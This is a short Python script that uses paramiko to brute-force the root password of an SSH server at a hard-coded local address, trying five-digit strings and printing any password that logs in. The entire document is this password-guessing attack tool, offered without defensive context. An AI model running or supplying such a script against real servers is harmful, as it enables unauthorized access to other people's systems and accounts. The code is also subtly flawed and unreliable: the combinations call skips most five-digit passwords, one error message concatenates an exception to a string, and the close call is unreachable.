import paramiko, sys, os, socket 
import itertools,string,crypt 

PASS_SIZE = 5
IP = "127.0.0.1"
USER = "root"
PORT=22
  
var = itertools.combinations(string.digits,PASS_SIZE)
 
try:
    for i in var:
        passwd = ''.join(i)
 
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
 
        try:
            ssh.connect(IP , port=PORT, username=USER, password=passwd)
            print("Connected successfully. Password = "+passwd)
            break
        except paramiko.AuthenticationException as error:
            print("Incorrect password: "+passwd)
            continue
        except socket.error as error:
            print(error)
            continue
        except paramiko.SSHException as error:
            print(error)
            print("Most probably this is caused by a missing host key")
            continue
        except Exception as error:
            print("Unknown error: "+error)
            continue    
        ssh.close()
 
 
except Exception as error :
    print(error)